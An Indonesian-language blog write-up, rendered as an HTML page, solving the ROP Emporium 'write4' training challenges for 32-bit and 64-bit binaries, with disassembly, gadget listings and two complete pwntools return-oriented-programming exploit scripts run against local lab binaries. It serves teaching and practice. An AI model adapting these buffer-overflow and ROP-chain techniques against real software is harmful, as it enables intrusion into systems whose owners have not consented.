<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Writeup ROP Emporium write4 [pwn] | ahm4ddm</title><meta name=keywords content><meta name=description content="Daftar Isi Download     write432 klik   write4 klik    write432 Kita cek terlebih filenya.
Didapatkan file ELF, dan dynamically linked
$file write432 write432: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=7142f5deace762a46e5cc43b6ca7e8818c9abe69, not stripped Lalu kita cek proteksi pada file.
didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.
kita bisa bypass NX dengan metode return oriented programming (rop)."><meta name=author content><link rel=canonical href=https://ahm4ddm.github.io/writeups/writeup-rope-write4/><link href=/assets/css/stylesheet.min.23ca66c33946ea0cee2c04d1168bf7a5e397fb03f9bcd6cc11a233ae8e51b097.css integrity="sha256-I8pmwzlG6gzuLATRFov3peOX+wP5vNbMEaIzro5RsJc=" rel="preload stylesheet" as=style><link rel=icon href=https://ahm4ddm.github.io/fav.ico><link rel=icon type=image/png sizes=16x16 href=https://ahm4ddm.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ahm4ddm.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://ahm4ddm.github.io/apple-touch-icon.png><link rel=mask-icon href=https://ahm4ddm.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.80.0"><meta property="og:title" content="Writeup ROP Emporium write4 [pwn]"><meta property="og:description" content="Daftar Isi Download     write432 klik   write4 klik    write432 Kita cek terlebih filenya.
Didapatkan file ELF, dan dynamically linked
$file write432 write432: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=7142f5deace762a46e5cc43b6ca7e8818c9abe69, not stripped Lalu kita cek proteksi pada file.
didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.
kita bisa bypass NX dengan metode return oriented programming (rop)."><meta property="og:type" content="article"><meta property="og:url" content="https://ahm4ddm.github.io/writeups/writeup-rope-write4/"><meta property="article:published_time" content="2021-02-19T23:09:03+07:00"><meta property="article:modified_time" content="2021-02-19T23:09:03+07:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Writeup ROP Emporium write4 [pwn]"><meta name=twitter:description content="Daftar Isi Download     write432 klik   write4 klik    write432 Kita cek terlebih filenya.
Didapatkan file ELF, dan dynamically linked
$file write432 write432: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=7142f5deace762a46e5cc43b6ca7e8818c9abe69, not stripped Lalu kita cek proteksi pada file.
didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.
kita bisa bypass NX dengan metode return oriented programming (rop)."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Writeup ROP Emporium write4 [pwn]","name":"Writeup ROP Emporium write4 [pwn]","description":"Daftar Isi Download     write432 klik   write4 klik    write432 Kita cek terlebih filenya.\nDidapatkan file ELF, dan dynamically linked\n$file write432 write432: ELF 32-bit LSB …","keywords":[],"articleBody":"   Daftar Isi Download     write432 klik   write4 klik    write432 Kita cek terlebih filenya.\nDidapatkan file ELF, dan dynamically linked\n$file write432 write432: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=7142f5deace762a46e5cc43b6ca7e8818c9abe69, not stripped Lalu kita cek proteksi pada file.\ndidapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\nkita bisa bypass NX dengan metode return oriented programming (rop).\n$checksec write432 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) RUNPATH: b'.' Kita cek menggunakan gdb untuk menampilkan semua fungsi.\ngdb-peda$ info function All defined functions: Non-debugging symbols: ... ... ... 0x08048500 frame_dummy 0x08048506 main 0x0804852a usefulFunction 0x08048543 usefulGadgets 0x08048550 __libc_csu_init 0x080485b0 __libc_csu_fini 0x080485b4 _fini Kita coba lakukan disassembly fungsi main\ngdb-peda$ pdisas main Dump of assembler code for function main: ... ... ... 0x08048513 :\tpush ecx 0x08048514 :\tsub esp,0x4 0x08048517 :\tcall 0x80483b0  ... ... ... Pada fungsi main memanggil pwnme\nKita lakukan disassembly fungsinya\ngdb-peda$ pdisas 0x80483b0 Dump of assembler code from 0x80483b0 to 0x80483d0::\tDump of assembler code from 0x80483b0 to 0x80483d0: 0x080483b0 :\tjmp DWORD PTR ds:0x804a00c 0x080483b6 :\tpush 0x0 0x080483bb :\tjmp 0x80483a0 0x080483c0 :\tjmp DWORD PTR ds:0x804a010 0x080483c6 :\tpush 0x8 0x080483cb :\tjmp 0x80483a0 End of assembler dump. Setelah saya analisa ada fungsi yang menurut saya menarik tapi tidak pernah terpanggil. nah menggunakan metode Return Oriented Programming (rop) sebagai solusi.\nPada fungsi usefulFunction kita gunakan untuk mencetak flag.\ngdb-peda$ pdisas 0x0804852a Dump of assembler code from 0x804852a to 0x804854a::\tDump of assembler code from 0x804852a to 0x804854a: 0x0804852a :\tpush ebp 0x0804852b :\tmov ebp,esp 0x0804852d :\tsub esp,0x8 0x08048530 :\tsub esp,0xc 0x08048533 :\tpush 0x80485d0 0x08048538 :\tcall 0x80483d0  0x0804853d :\tadd esp,0x10 0x08048540 :\tnop 0x08048541 :\tleave 0x08048542 :\tret 0x08048543 :\tmov DWORD PTR [edi],ebp 0x08048545 :\tret 0x08048546 :\txchg ax,ax 0x08048548 :\txchg ax,ax End of assembler dump. Permasalahannya yaitu tidak ada string ‘/bin/cat flag.txt’.\nOn completing our usual checks for interesting strings and symbols in this binary we're confronted with the stark truth that our favourite string \"/bin/cat flag.txt\" is not present this time. Pada fungsi usefulGadgets kita bisa menulis string ‘flag.txt’.\ngdb-peda$ pdisas 0x08048543 Dump of assembler code from 0x8048543 to 0x8048563::\tDump of assembler code from 0x8048543 to 0x8048563: 0x08048543 :\tmov DWORD PTR [edi],ebp 0x08048545 :\tret ... ... ... namun yang jadi masalah yaitu apakah ada permissions write pada file ELF tersebut, karena kalau tidak ada permissions tersebut tidak bisa walaupun sudah kita buat string ‘flag.txt’. pada arsitektur 32-bit kita menulis nilai sebesar 4 byte.\nSection Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al ... ... ... [23] .got.plt PROGBITS 0804a000 001000 000018 04 WA 0 0 4 [24] .data PROGBITS 0804a018 001018 000008 00 WA 0 0 4 [25] .bss NOBITS 0804a020 001020 000004 00 WA 0 0 1 [26] .comment PROGBITS 00000000 001020 000029 01 MS 0 0 1 [27] .symtab SYMTAB 00000000 00104c 000440 10 28 47 4 [28] .strtab STRTAB 00000000 00148c 000211 00 0 0 1 [29] .shstrtab STRTAB 00000000 00169d 000105 00 0 0 1 ternyata .got.plt .data .bss permissions Write(W), jadi kita bisa mencetak flag.txt.\nkita cari pop 2 kali\nGadgets information ============================================================ 0x080485ab : pop ebp ; ret 0x080485a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x0804839d : pop ebx ; ret 0x080485aa : pop edi ; pop ebp ; ret 0x080485a9 : pop esi ; pop edi ; pop ebp ; ret 0x08048386 : ret 0x0804849e : ret 0xeac1 Unique gadgets found: 7 saya gunakan pop edi pop ebp ret karena pada fungsi usefulGadgets nilai register ebp akan dipindahkan ke register edi\n0x08048543 :\tmov DWORD PTR [edi],ebp\nKita buat kode exeploit\nfrom pwn import * p = ELF('./write432') r = process('./write432') printFlag = p.plt['print_file'] gadgets = p.symbols['usefulGadgets'] pop_edi_ebp = 0x080485aa bss = 0x804a020 log.info('print_flag 0x%x' %printFlag) log.info('gadgets 0x%x' %gadgets) log.info('pop edi ebp ret 0x%x' %pop_edi_ebp) log.info('bss 0x%x' %bss) junk = b'X'*44 payload = junk payload += p32(pop_edi_ebp) payload += p32(bss) payload += b'flag' payload += p32(gadgets) payload += p32(pop_edi_ebp) payload += p32(bss + 0x4) payload += b'.txt' payload += p32(gadgets) payload += p32(printFlag) payload += b'Y'*4 payload += p32(bss) r.sendline(payload) r.interactive() Jalankan maka didapatkan flag\n$python3 sol.py  Thank you! ROPE{a_placeholder_32byte_flag!} [*] Process './write432' stopped with exit code -11 (SIGSEGV) (pid 12182) [*] Got EOF while reading in interactive $ write4 Kita cek terlebih filenya.\nDidapatkan file ELF, dan dynamically linked\n$file write4 write4: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4cbaee0791e9daa7dcc909399291b57ffaf4ecbe, not stripped Lalu kita cek proteksi pada file.\ndidapatkan NX aktif yang mana kita tidak bisa membuat shellcode.\nkita bisa bypass NX dengan metode return oriented programming (rop).\n$checksec write4 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'.' Kita cek menggunakan gdb untuk menampilkan semua fungsi.\ngdb-peda$ info function All defined functions: Non-debugging symbols: ... ... ... 0x0000000000400600 frame_dummy 0x0000000000400607 main 0x0000000000400617 usefulFunction 0x0000000000400628 usefulGadgets 0x0000000000400630 __libc_csu_init 0x00000000004006a0 __libc_csu_fini 0x00000000004006a4 _fini Hampir sama dengan binary 64 namun ada sedikit perbedaan pada fungsi usefulGadgets\ngdb-peda$ pdisas usefulGadgets Dump of assembler code for function usefulGadgets: 0x0000000000400628 :\tmov QWORD PTR [r14],r15 0x000000000040062b :\tret 0x000000000040062c :\tnop DWORD PTR [rax+0x0] End of assembler dump. Kita cek permisssions pada file section\nSection Headers: [Nr] Name Type Address Offset Size EntSize Flags Link Info Align [21] .got PROGBITS 0000000000600ff0 00000ff0 0000000000000010 0000000000000008 WA 0 0 8 [22] .got.plt PROGBITS 0000000000601000 00001000 0000000000000028 0000000000000008 WA 0 0 8 [23] .data PROGBITS 0000000000601028 00001028 0000000000000010 0000000000000000 WA 0 0 8 [24] .bss NOBITS 0000000000601038 00001038 0000000000000008 0000000000000000 WA 0 0 1 .got .got.plt .data .bss didapatkan permissions Write (W).\nkita cari pop r14 r15 dan pop rdi\nGadgets information ============================================================ 0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret 0x0000000000400629 : mov dword ptr [rsi], edi ; ret 0x0000000000400610 : mov eax, 0 ; pop rbp ; ret 0x0000000000400628 : mov qword ptr [r14], r15 ; ret 0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret 0x0000000000400690 : pop r14 ; pop r15 ; ret 0x0000000000400692 : pop r15 ; ret 0x000000000040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret 0x0000000000400588 : pop rbp ; ret 0x0000000000400693 : pop rdi ; ret 0x0000000000400691 : pop rsi ; pop r15 ; ret 0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004004e6 : ret Unique gadgets found: 15 Saya memakai 0x0000000000400690 untuk pop 14 pop 15 dan 0x0000000000400693 untuk pop rdi.\nKita buat kode exploit\nfrom pwn import * p = ELF('./write4') r = process('./write4') gadgets = p.symbols['usefulGadgets'] printFlag = p.symbols['print_file'] bss = 0x000000000601038 pop_r14_r15 = 0x0000000000400690 pop_rdi = 0x0000000000400693 log.info('print_flag 0x%x' %printFlag) log.info('gadgets 0x%x' %gadgets) log.info('pop rdi 0x%x' %pop_rdi) log.info('mov r14 r15 0x%x' %gadgets) log.info('pop r14 r15 0x%x' %pop_r14_r15) log.info('bss 0x%x' %bss) junk = b'X'*40 payload = junk payload += p64(pop_r14_r15) payload += p64(bss) payload += b'flag.txt' payload += p64(gadgets) payload += p64(pop_rdi) payload += p64(bss) payload += p64(printFlag) r.sendline(payload) r.interactive() Jalankan maka didapatkan flag\n$python3 sol.py  Thank you! ROPE{a_placeholder_32byte_flag!} [*] Process './write4' stopped with exit code -11 (SIGSEGV) (pid 13422) [*] Got EOF while reading in interactive $ ","wordCount":"1254","inLanguage":"en","datePublished":"2021-02-19T23:09:03+07:00","dateModified":"2021-02-19T23:09:03+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ahm4ddm.github.io/writeups/writeup-rope-write4/"},"publisher":{"@type":"Organization","name":"ahm4ddm","logo":{"@type":"ImageObject","url":"https://ahm4ddm.github.io/fav.ico"}}}</script></head><body id=top><script>if(localStorage.getItem("pref-theme")==="dark"){document.body.classList.add('dark');}else if(localStorage.getItem("pref-theme")==="light"){document.body.classList.remove('dark')}else if(window.matchMedia('(prefers-color-scheme: dark)').matches){document.body.classList.add('dark');}</script><noscript><style type=text/css>.theme-toggle,.top-link{display:none}</style></noscript><header class=header><nav class=nav><div class=logo><a href=https://ahm4ddm.github.io accesskey=h title="ahm4ddm (Alt + H)"><img src=/home.png alt=logo aria-label=logo height=30px>ahm4ddm</a>
<span class=logo-switches><a id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></span></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://ahm4ddm.github.io/writeups/ title=writeups><span>writeups</span></a></li><li><a href=https://ahm4ddm.github.io/colleges/ title=colleges><span>colleges</span></a></li><li><a href=https://ahm4ddm.github.io/projects/ title=projects><span>projects</span></a></li><li><a href=https://ahm4ddm.github.io/archives/ title=archives><span>archives</span></a></li><li><a href=https://ahm4ddm.github.io/about/ title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>Writeup ROP Emporium write4 [pwn]</h1><div class=post-meta>February 19, 2021&nbsp;·&nbsp;6 min</div></header><div class=post-content><table><thead><tr><th>Daftar Isi</th><th>Download</th></tr></thead><tbody><tr><td><a href=#write432>write432</a></td><td><a href=https://github.com/ahm4ddm/larebinex/blob/main/32/write432/write432>klik</a></td></tr><tr><td><a href=#write4>write4</a></td><td><a href=https://github.com/ahm4ddm/larebinex/blob/main/64/write4/write4>klik</a></td></tr></tbody></table><h3 id=write432>write432<a hidden class=anchor aria-hidden=true href=#write432>#</a></h3><p>Kita cek terlebih filenya.<br>Didapatkan file ELF, dan dynamically linked</p><pre><code>$file write432
write432: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=7142f5deace762a46e5cc43b6ca7e8818c9abe69, not stripped
</code></pre><p>Lalu kita cek proteksi pada file.<br>didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.<br>kita bisa bypass NX dengan metode return oriented programming (rop).</p><pre><code>$checksec write432
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b'.' 
</code></pre><p>Kita cek menggunakan gdb untuk menampilkan semua fungsi.</p><pre><code>gdb-peda$ info function
All defined functions:

Non-debugging symbols:
...
...
...
0x08048500  frame_dummy
0x08048506  main
0x0804852a  usefulFunction
0x08048543  usefulGadgets
0x08048550  __libc_csu_init
0x080485b0  __libc_csu_fini
0x080485b4  _fini
</code></pre><p>Kita coba lakukan disassembly fungsi <em><strong>main</strong></em></p><pre><code>gdb-peda$ pdisas main
Dump of assembler code for function main:
...
...
...
   0x08048513 &lt;+13&gt;:	push   ecx
   0x08048514 &lt;+14&gt;:	sub    esp,0x4
   0x08048517 &lt;+17&gt;:	call   0x80483b0 &lt;pwnme@plt&gt;
...
...
...
</code></pre><p>Pada fungsi <em><strong>main</strong></em> memanggil <em><strong>pwnme</strong></em><br>Kita lakukan disassembly fungsinya</p><pre><code>gdb-peda$ pdisas 0x80483b0
Dump of assembler code from 0x80483b0 to 0x80483d0::	Dump of assembler code from 0x80483b0 to 0x80483d0:
   0x080483b0 &lt;pwnme@plt+0&gt;:	jmp    DWORD PTR ds:0x804a00c
   0x080483b6 &lt;pwnme@plt+6&gt;:	push   0x0
   0x080483bb &lt;pwnme@plt+11&gt;:	jmp    0x80483a0
   0x080483c0 &lt;__libc_start_main@plt+0&gt;:	jmp    DWORD PTR ds:0x804a010
   0x080483c6 &lt;__libc_start_main@plt+6&gt;:	push   0x8
   0x080483cb &lt;__libc_start_main@plt+11&gt;:	jmp    0x80483a0
End of assembler dump.
</code></pre><p>Setelah saya analisa ada fungsi yang menurut saya menarik tapi tidak pernah terpanggil. nah menggunakan metode Return Oriented Programming (rop) sebagai solusi.<br>Pada fungsi <em><strong>usefulFunction</strong></em> kita gunakan untuk mencetak flag.</p><pre><code>gdb-peda$ pdisas 0x0804852a
Dump of assembler code from 0x804852a to 0x804854a::	Dump of assembler code from 0x804852a to 0x804854a:
   0x0804852a &lt;usefulFunction+0&gt;:	push   ebp
   0x0804852b &lt;usefulFunction+1&gt;:	mov    ebp,esp
   0x0804852d &lt;usefulFunction+3&gt;:	sub    esp,0x8
   0x08048530 &lt;usefulFunction+6&gt;:	sub    esp,0xc
   0x08048533 &lt;usefulFunction+9&gt;:	push   0x80485d0
   0x08048538 &lt;usefulFunction+14&gt;:	call   0x80483d0 &lt;print_file@plt&gt;
   0x0804853d &lt;usefulFunction+19&gt;:	add    esp,0x10
   0x08048540 &lt;usefulFunction+22&gt;:	nop
   0x08048541 &lt;usefulFunction+23&gt;:	leave  
   0x08048542 &lt;usefulFunction+24&gt;:	ret    
   0x08048543 &lt;usefulGadgets+0&gt;:	mov    DWORD PTR [edi],ebp
   0x08048545 &lt;usefulGadgets+2&gt;:	ret    
   0x08048546 &lt;usefulGadgets+3&gt;:	xchg   ax,ax
   0x08048548 &lt;usefulGadgets+5&gt;:	xchg   ax,ax
End of assembler dump.
</code></pre><p>Permasalahannya yaitu tidak ada string &lsquo;/bin/cat flag.txt&rsquo;.</p><pre><code>On completing our usual checks for interesting strings and symbols in this binary we're confronted with the stark truth that our favourite string &quot;/bin/cat flag.txt&quot; is not present this time.
</code></pre><p>Pada fungsi <em><strong>usefulGadgets</strong></em> kita bisa menulis string &lsquo;flag.txt&rsquo;.</p><pre><code>gdb-peda$ pdisas 0x08048543
Dump of assembler code from 0x8048543 to 0x8048563::	Dump of assembler code from 0x8048543 to 0x8048563:
   0x08048543 &lt;usefulGadgets+0&gt;:	mov    DWORD PTR [edi],ebp
   0x08048545 &lt;usefulGadgets+2&gt;:	ret    
...
...
...
</code></pre><p>namun yang jadi masalah yaitu apakah ada permissions write pada file ELF tersebut, karena kalau tidak ada permissions tersebut tidak bisa walaupun sudah kita buat string &lsquo;flag.txt&rsquo;. pada arsitektur 32-bit kita menulis nilai sebesar 4 byte.</p><pre><code>Section Headers:
 [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
...
...
...
 [23] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4
 [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
 [25] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1
 [26] .comment          PROGBITS        00000000 001020 000029 01  MS  0   0  1
 [27] .symtab           SYMTAB          00000000 00104c 000440 10     28  47  4
 [28] .strtab           STRTAB          00000000 00148c 000211 00      0   0  1
 [29] .shstrtab         STRTAB          00000000 00169d 000105 00      0   0  1
</code></pre><p>ternyata .got.plt .data .bss permissions Write(W), jadi kita bisa mencetak flag.txt.<br>kita cari pop 2 kali</p><pre><code>Gadgets information
============================================================
0x080485ab : pop ebp ; ret
0x080485a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804839d : pop ebx ; ret
0x080485aa : pop edi ; pop ebp ; ret
0x080485a9 : pop esi ; pop edi ; pop ebp ; ret
0x08048386 : ret
0x0804849e : ret 0xeac1

Unique gadgets found: 7
</code></pre><p>saya gunakan <em><strong>pop edi pop ebp ret</strong></em> karena pada fungsi <em><strong>usefulGadgets</strong></em> nilai register ebp akan dipindahkan ke register edi<br><em><strong>0x08048543 &lt;+0>: mov DWORD PTR [edi],ebp</strong></em><br>Kita buat kode exeploit</p><pre><code>from pwn import *

p = ELF('./write432')
r = process('./write432')
printFlag = p.plt['print_file']
gadgets = p.symbols['usefulGadgets']
pop_edi_ebp = 0x080485aa
bss = 0x804a020
log.info('print_flag 0x%x' %printFlag)
log.info('gadgets 0x%x' %gadgets)
log.info('pop edi ebp ret 0x%x' %pop_edi_ebp)
log.info('bss 0x%x' %bss)
junk = b'X'*44
payload = junk
payload += p32(pop_edi_ebp)
payload += p32(bss)
payload += b'flag'
payload += p32(gadgets)
payload += p32(pop_edi_ebp)
payload += p32(bss + 0x4)
payload += b'.txt'
payload += p32(gadgets)
payload += p32(printFlag)
payload += b'Y'*4
payload += p32(bss)
r.sendline(payload)
r.interactive()
</code></pre><p>Jalankan maka didapatkan flag</p><pre><code>$python3 sol.py
&gt; Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Process './write432' stopped with exit code -11 (SIGSEGV) (pid 12182)
[*] Got EOF while reading in interactive
$  
</code></pre><h3 id=write4>write4<a hidden class=anchor aria-hidden=true href=#write4>#</a></h3><p>Kita cek terlebih filenya.<br>Didapatkan file ELF, dan dynamically linked</p><pre><code>$file write4
write4: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4cbaee0791e9daa7dcc909399291b57ffaf4ecbe, not stripped
</code></pre><p>Lalu kita cek proteksi pada file.<br>didapatkan NX aktif yang mana kita tidak bisa membuat shellcode.<br>kita bisa bypass NX dengan metode return oriented programming (rop).</p><pre><code>$checksec write4
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
</code></pre><p>Kita cek menggunakan gdb untuk menampilkan semua fungsi.</p><pre><code>gdb-peda$ info function
All defined functions:

Non-debugging symbols:
...
...
...
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400628  usefulGadgets
0x0000000000400630  __libc_csu_init
0x00000000004006a0  __libc_csu_fini
0x00000000004006a4  _fini
</code></pre><p>Hampir sama dengan binary 64 namun ada sedikit perbedaan pada fungsi <em><strong>usefulGadgets</strong></em></p><pre><code>gdb-peda$ pdisas usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x0000000000400628 &lt;+0&gt;:	mov    QWORD PTR [r14],r15
   0x000000000040062b &lt;+3&gt;:	ret    
   0x000000000040062c &lt;+4&gt;:	nop    DWORD PTR [rax+0x0]
End of assembler dump.
</code></pre><p>Kita cek permisssions pada file section</p><pre><code>Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [21] .got              PROGBITS         0000000000600ff0  00000ff0
       0000000000000010  0000000000000008  WA       0     0     8
  [22] .got.plt          PROGBITS         0000000000601000  00001000
       0000000000000028  0000000000000008  WA       0     0     8
  [23] .data             PROGBITS         0000000000601028  00001028
       0000000000000010  0000000000000000  WA       0     0     8
  [24] .bss              NOBITS           0000000000601038  00001038
       0000000000000008  0000000000000000  WA       0     0     1
</code></pre><p>.got .got.plt .data .bss didapatkan permissions Write (W).<br>kita cari pop r14 r15 dan pop rdi</p><pre><code>Gadgets information
============================================================
0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret
0x0000000000400629 : mov dword ptr [rsi], edi ; ret
0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
0x0000000000400628 : mov qword ptr [r14], r15 ; ret
0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400690 : pop r14 ; pop r15 ; ret
0x0000000000400692 : pop r15 ; ret
0x000000000040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400588 : pop rbp ; ret
0x0000000000400693 : pop rdi ; ret
0x0000000000400691 : pop rsi ; pop r15 ; ret
0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004e6 : ret

Unique gadgets found: 15
</code></pre><p>Saya memakai <em><strong>0x0000000000400690</strong></em> untuk pop 14 pop 15 dan <em><strong>0x0000000000400693</strong></em> untuk pop rdi.<br>Kita buat kode exploit</p><pre><code>from pwn import *

p = ELF('./write4')
r = process('./write4')

gadgets = p.symbols['usefulGadgets']
printFlag = p.symbols['print_file']
bss = 0x000000000601038
pop_r14_r15 = 0x0000000000400690
pop_rdi = 0x0000000000400693
log.info('print_flag 0x%x' %printFlag)
log.info('gadgets 0x%x' %gadgets)
log.info('pop rdi 0x%x' %pop_rdi)
log.info('mov r14 r15 0x%x' %gadgets)
log.info('pop r14 r15 0x%x' %pop_r14_r15)
log.info('bss 0x%x' %bss)
junk = b'X'*40
payload = junk
payload += p64(pop_r14_r15)
payload += p64(bss)
payload += b'flag.txt'
payload += p64(gadgets)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(printFlag)
r.sendline(payload)
r.interactive()
</code></pre><p>Jalankan maka didapatkan flag</p><pre><code>$python3 sol.py
&gt; Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Process './write4' stopped with exit code -11 (SIGSEGV) (pid 13422)
[*] Got EOF while reading in interactive
$  
</code></pre></div><footer class=post-footer></footer></article></main><footer class=footer><span>&copy; 2021 <a href=https://ahm4ddm.github.io>ahm4ddm</a></span>
<span>&#183;</span>
<span>Powered by <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span>
<span>&#183;</span>
<span>Theme <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script defer src=/assets/js/highlight.min.27cd435cc9ed6abb4b496581b151804f79f366c412620272bb94e2f5f598ebcc.js integrity="sha256-J81DXMntartLSWWBsVGAT3nzZsQSYgJyu5Ti9fWY68w=" onload=hljs.initHighlightingOnLoad();></script><script>window.onload=function(){if(localStorage.getItem("menu-scroll-position")){document.getElementById('menu').scrollLeft=localStorage.getItem("menu-scroll-position");}}
document.querySelectorAll('a[href^="#"]').forEach(anchor=>{anchor.addEventListener("click",function(e){e.preventDefault();var id=this.getAttribute("href").substr(1);if(!window.matchMedia('(prefers-reduced-motion: reduce)').matches){document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({behavior:"smooth"});}else{document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();}
if(id==="top"){history.replaceState(null,null," ");}else{history.pushState(null,null,`#${id}`);}});});var mybutton=document.getElementById("top-link");window.onscroll=function(){if(document.body.scrollTop>800||document.documentElement.scrollTop>800){mybutton.style.visibility="visible";mybutton.style.opacity="1";}else{mybutton.style.visibility="hidden";mybutton.style.opacity="0";}};function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById('menu').scrollLeft);}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{if(document.body.className.includes("dark")){document.body.classList.remove('dark');localStorage.setItem("pref-theme",'light');}else{document.body.classList.add('dark');localStorage.setItem("pref-theme",'dark');}})</script></body></html>